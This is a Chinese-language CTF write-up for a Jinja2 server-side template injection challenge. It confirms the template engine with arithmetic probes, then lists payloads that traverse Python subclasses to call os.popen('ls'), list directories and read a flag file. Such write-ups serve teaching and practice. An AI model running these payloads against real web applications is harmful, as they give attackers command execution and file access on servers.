# Web_python_template_injection

首先我试试一些页面, 返回:

```
URL http://111.200.241.244:51903/robots.txt not found
```

因为题目提示本题是 `Web_python_template_injection`. 那就可以试一些 `SSTI` 的 `payload`, 用 `/{{7*7}}` 返回:

```
URL http://111.200.241.244:51903/49 not found
```

试 `/{{7*'7'}}` 返回:

```
URL http://111.200.241.244:51903/7777777 not found
```

可以确认是 `Jinja2` 模版. (参考 [payloads all the thing](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2))

接下来查看所有模块:

```
{{ [].__class__.__base__.__subclasses__()}}
{{ {}.__class__.__base__.__subclasses__()}}
{{ ().__class__.__base__.__subclasses__()}}
{{ ''.__class__.__base__.__subclasses__()}}
```

这四种符号开头都是可以执行的.在本题中利用 `''` 来构建语句会产生报错, 其余不会报错.

```
__class__ 返回类型所属的对象
__base__  返回该对象所继承的基类
__subclasses__ 每个新类都保留了子类的引用,这个方法返回一个类中仍然可用的引用列表
```

一些可以利用:

```
[71]对应 site._Printer
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}
```

```
[76]对应 site.Quitter
{{[].__class__.__base__.__subclasses__()[76].__init__.__globals__['os'].popen('ls').read()}}
```

```
[40]对应 type file, 可以实现文件包含
{{[].__class__.__base__.__subclasses__()[40]('fl4g').read()}}
```

